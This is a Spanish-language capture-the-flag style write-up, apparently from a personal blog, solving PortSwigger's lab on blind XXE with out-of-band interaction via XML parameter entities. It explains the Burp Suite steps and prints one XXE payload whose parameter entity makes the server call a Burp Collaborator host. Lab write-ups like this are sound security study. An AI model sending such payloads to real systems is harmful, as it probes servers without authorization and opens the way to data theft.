---
layout: single
title: Blind XXE with out-of-band interaction via XML parameter entities – PortSwigger Write Up
excerpt: "En este post vamos a estar resolviendo el laboratorio de PortSwigger: “Blind XXE with out-of-band interaction via XML parameter entities."
date: 2022-10-16
classes: wide
#header:
#  teaser: /assets/images/portswigger/stored_xss_into_html_context_with_nothing_encoded/portada.png
#  teaser_home_page: true
categories:
  - Portswigger
tags:
  - XML injection
  - Practitioner
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "Blind XXE with out-of-band interaction via XML parameter entities."

## Pasos

Este laboratorio tiene una función "Check stock" que analiza la entrada XML, pero no muestra valores inesperados y bloquea las solicitudes que contienen entidades externas regulares.

Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/1.png" width="1000">
</p><br>

Vemos que en esta situación es una tienda donde podemos ver los detalles de los productos y si nos fijamos podemos ver el stock de cada uno de los productos.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/2.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/3.png" width="1000">
</p><br>

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en Check stock y buscamos el paquete en el Http history y lo enviamos al `Repeater`.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/4.png" width="1000">
</p><br>

Entonces ahora lo que haremos será inciar el Burp collaborator y `copiar del clipboard`.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/5.png" width="1000">
</p><br>


<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction_via_xml_parameter_entities/6.png" width="1000">
</p><br>


Con el clipboard copiado haremos una consulta con el siguiente payload basado en la escructura XML del paquete.

```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://2ehviuch47rt4tyrmzdpznOzr5ht6.oastify.com/testing"> %xxe; ]>
<stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
</stockCheck>
```

Una anotación a destacar en este payload que el `%` hace que se autoejecute en la entidad el payload. Sin tener que nombrarlo en un `valor`.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/7.png" width="1000">
</p><br>

Como podemos ver, se realizó la consulta al sitio web generado con Burp Collaborator, aunque no existió ninguna respuesta por lado del servidor mas que el error de `Parsing error`. Entramos al `home` 
del laboratorio desde el navegador para verificar que completamos el laboratorio.


<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/9.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/10.png" width="1000">
</p><br>


¡Un saludo y espero que os sirva de apoyo!
